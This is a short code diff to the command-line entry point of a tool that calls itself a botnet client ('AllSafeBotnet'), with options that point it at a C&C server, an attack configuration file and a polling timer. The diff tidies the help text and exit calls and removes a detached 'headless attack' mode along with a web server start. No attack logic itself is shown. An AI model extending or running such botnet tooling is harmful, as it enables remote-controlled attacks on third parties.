@@ -183,7 +183,14 @@ if __name__ == "__main__":
                     autopilot_timer = 0
             except Exception:
                 print("Error entering autopilot mode - timer was invalid")
-                sys.exit(EnvironmentError)
+                sys.exit()
+
+        elif '--help' in argument:
+            print("Usage: python3 __init__.py [--OPTION=value]")
+            print(" --remote=<remote address for c&c server>")
+            print(" --config=<configuration file complete path>")
+            print(" --timer=<integer between each update request to C&C")
+            sys.exit()
 
         if '--remote' in argument:
             try:
@@ -193,7 +200,7 @@ if __name__ == "__main__":
                 allsafe.autopilot(cc_server, "", autopilot_timer, override=False)
             except Exception:
                 print("Error entering autopilot mode - invalid remote address")
-                sys.exit(EnvironmentError)
+                sys.exit()
 
         elif '--config' in argument:
             try:
@@ -202,36 +209,4 @@ if __name__ == "__main__":
                 allsafe.autopilot("", configuration, autopilot_timer, override=True)
             except Exception:
                 print('Error entering autopilot mode - local configuration')
-                sys.exit(EnvironmentError)
-
-        elif '--help'   in argument:
-            print("Usage: python3 __init__.py [--OPTION=value]")
-            print(" --remote=<remote address for c&c server>")
-            print(" --config=<configuration file complete path>")
-            print(" --timer=<integer between each update request to C&C")
-
-
-    if '--detach' in sys.argv:
-        if '--remote' in sys.argv:
-            try:
-                print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
-                cc_server = sys.argv[sys.argv.index('--remote') + 1]
-                print("- botnet C&C located at:", cc_server)
-                allsafe = Botnet.AllSafeBotnet()
-                allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
-            except Exception:
-                print("Error entering autopilot mode!")
-                sys.exit(EnvironmentError)
-        elif '--config' in sys.argv:
-            try:
-                print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
-                configuration = sys.argv[sys.argv.index('--config') + 1]
-                print("- botnet client configuration at:", configuration)
-                allsafe.autopilot("", configuration, 5, override=True)
-            except Exception:
-                print('Error entering autopilot mode - local configuration')
-                sys.exit(EnvironmentError)
-        else:
-            print("Usage: --detach [--remote <cc_server>] [--config <config_path>]")
-    else:
-        app.run(host='0.0.0.0', port=4042)
+                sys.exit()
